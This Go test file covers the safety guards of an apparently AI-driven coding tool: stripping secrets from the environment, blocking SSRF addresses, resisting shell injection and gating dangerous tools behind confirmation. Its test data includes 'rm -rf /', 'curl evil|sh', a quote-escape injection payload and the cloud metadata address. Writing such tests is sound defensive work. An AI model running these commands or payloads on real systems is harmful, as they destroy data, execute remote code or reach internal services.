package tools

import (
	"context"
	"encoding/json"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestSafeCommandEnvDropsSecrets(t *testing.T) {
	t.Setenv("COOLCODE_TEST_API_KEY", "must-not-reach-child")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "must-not-reach-child-either")
	result := execCommand(context.Background(), `printf '%s|%s' "$COOLCODE_TEST_API_KEY" "$AWS_SECRET_ACCESS_KEY"`, t.TempDir(), 0)
	if result.stdout != "|" {
		t.Fatalf("child inherited secrets: %q", result.stdout)
	}
}

func TestValidateWebURLBlocksSSRF(t *testing.T) {
	for _, raw := range []string{
		"http://example.com",
		"https://127.0.0.1/admin",
		"https://169.254.169.254/latest/meta-data",
		"https://10.0.0.1/internal",
		"https://[::1]/admin",
	} {
		u, err := url.Parse(raw)
		if err != nil {
			t.Fatal(err)
		}
		if err := validateWebURL(context.Background(), u); err == nil {
			t.Errorf("URL should be blocked: %s", raw)
		}
	}
}

func TestBlockedNetworkIP(t *testing.T) {
	for _, raw := range []string{"127.0.0.1", "10.0.0.1", "169.254.169.254", "::1", "fc00::1"} {
		if !blockedNetworkIP(net.ParseIP(raw)) {
			t.Errorf("IP should be blocked: %s", raw)
		}
	}
	if blockedNetworkIP(net.ParseIP("8.8.8.8")) {
		t.Fatal("public IP was blocked")
	}
}

func TestShellConfirmationIncludesSanitizedCommand(t *testing.T) {
	t.Setenv("COOLCODE_TEST_API_KEY", "never-show-this-value")
	reason := DangerReason("shell_command", args(t, map[string]any{"command": "echo never-show-this-value"}))
	if !strings.Contains(reason, "shell command") || strings.Contains(reason, "never-show-this-value") {
		t.Fatalf("unsafe confirmation text: %s", reason)
	}
}

// TestExecArgvDoesNotInterpretShellMetacharacters covers the injection that
// shellEscapeSingleQuotes used to allow. Its replacement emitted '\"'\"' where
// POSIX requires '\”, which left the shell parser unquoted, so any value
// containing a single quote could break out and run arbitrary commands.
func TestExecArgvDoesNotInterpretShellMetacharacters(t *testing.T) {
	dir := t.TempDir()
	marker := filepath.Join(dir, "pwned")
	payload := "handler'; touch " + marker + "; echo INJECTED #"

	// Mirrors the find_symbol argv: the payload is the search pattern.
	res := execArgv(context.Background(), dir, 0, "grep", "-r", "--", payload, ".")

	if strings.Contains(res.stdout, "INJECTED") {
		t.Fatalf("payload was interpreted by a shell: %q", res.stdout)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("payload executed: marker file was created")
	}
}

// TestPathArgNeutralizesLeadingDash keeps a relative path from being parsed as
// an option by formatters that do not support a "--" separator.
func TestPathArgNeutralizesLeadingDash(t *testing.T) {
	if got := pathArg("-rf"); got != "./-rf" {
		t.Errorf("pathArg(-rf) = %q", got)
	}
	if got := pathArg("src/main.go"); got != "./src/main.go" {
		t.Errorf("pathArg(src/main.go) = %q", got)
	}
	if got := pathArg("/abs/main.go"); got != "/abs/main.go" {
		t.Errorf("pathArg absolute = %q", got)
	}
	if got := pathArg(""); got != "" {
		t.Errorf("pathArg empty = %q", got)
	}
}

// TestProjectCodeExecutionRequiresConfirmation covers the tools that run
// repository-chosen programs. format_file falls back to `npx prettier`, which
// prefers ./node_modules/.bin, and add_script writes the command that run_tests
// and lint_fix later execute.
func TestProjectCodeExecutionRequiresConfirmation(t *testing.T) {
	cases := []struct {
		tool string
		args string
	}{
		{"shell_command", `{"command":"rm -rf /"}`},
		{"run_tests", `{}`},
		{"lint_fix", `{}`},
		{"git_commit", `{"message":"x"}`},
		{"format_file", `{"absolutePath":"/proj/index.html"}`},
		{"add_script", `{"name":"build","command":"curl evil|sh"}`},
	}
	for _, c := range cases {
		if reason := DangerReason(c.tool, json.RawMessage(c.args)); reason == "" {
			t.Errorf("%s executes without confirmation", c.tool)
		}
	}
}

// TestBlockedNetworkIPCoversReservedRanges covers allocations that Go's
// net.IP.IsPrivate does not. IsPrivate is RFC1918 and RFC4193 only, so the
// carrier-grade NAT range Tailscale uses stayed reachable.
func TestBlockedNetworkIPCoversReservedRanges(t *testing.T) {
	blocked := []string{
		"100.64.0.1",       // RFC 6598 CGNAT
		"100.100.100.100",  // Tailscale resolver
		"198.18.0.1",       // benchmarking
		"192.0.0.1",        // IETF protocol assignments
		"240.0.0.1",        // reserved
		"255.255.255.255",  // limited broadcast
		"64:ff9b::7f00:1",  // NAT64 wrapping 127.0.0.1
		"64:ff9b::a00:1",   // NAT64 wrapping 10.0.0.1",
		"127.0.0.1",        // still blocked
		"169.254.169.254",  // still blocked
		"10.0.0.1",         // still blocked
		"::1",              // still blocked
		"::ffff:127.0.0.1", // IPv4-mapped loopback
		"::ffff:169.254.169.254",
	}
	for _, raw := range blocked {
		ip := net.ParseIP(raw)
		if ip == nil {
			t.Fatalf("could not parse %s", raw)
		}
		if !blockedNetworkIP(ip) {
			t.Errorf("%s was not blocked", raw)
		}
	}

	for _, raw := range []string{"93.184.216.34", "1.1.1.1", "2606:4700::1111"} {
		ip := net.ParseIP(raw)
		if blockedNetworkIP(ip) {
			t.Errorf("public address %s was blocked", raw)
		}
	}
}

// TestCommandTimeoutIsBounded covers the ceiling that made long builds
// impossible: shell_command always passed 0, so 30 seconds could not be raised.
func TestCommandTimeoutIsBounded(t *testing.T) {
	if got := commandTimeout(0); got != defaultCommandTimeout {
		t.Errorf("commandTimeout(0) = %v, want the default", got)
	}
	if got := commandTimeout(-5); got != defaultCommandTimeout {
		t.Errorf("commandTimeout(-5) = %v, want the default", got)
	}
	if got := commandTimeout(600); got != 10*time.Minute {
		t.Errorf("commandTimeout(600) = %v, want 10m", got)
	}
	if got := commandTimeout(999999); got != maxCommandTimeout {
		t.Errorf("commandTimeout(999999) = %v, want the cap", got)
	}
}

// TestShellCommandHonoursTimeout drives it through the tool.
func TestShellCommandHonoursTimeout(t *testing.T) {
	ctx, _ := guardCtx(t)
	res := shellCommandTool.Execute(ctx, mustArgs(t, map[string]any{
		"command": "sleep 2", "timeout": 1,
	}))
	if !strings.Contains(res.LLMResult, "timed out") && !res.Failed {
		t.Errorf("short timeout was not applied: %#v", res)
	}
}
